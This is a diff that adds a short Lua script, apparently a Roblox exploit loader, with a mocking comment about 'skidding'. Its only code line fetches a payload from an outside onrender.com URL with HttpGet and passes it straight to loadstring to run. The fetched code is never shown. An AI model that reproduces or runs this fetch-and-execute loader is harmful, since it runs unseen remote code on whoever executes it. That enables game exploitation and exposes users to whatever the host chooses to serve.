@@ -1,0 +1,3 @@
+-- why bother skidding?
+
+loadstring(game:HttpGet("http://sunny-5n92.onrender.com/raw/1788b1aac45315b6870cd590a1f373d950b23a336752a0633016de0537fcfce7ef9aa8197d8f9290ce2d3d074429b05050a39702d3ce5b84cbe9490171bc9b7c", true))()
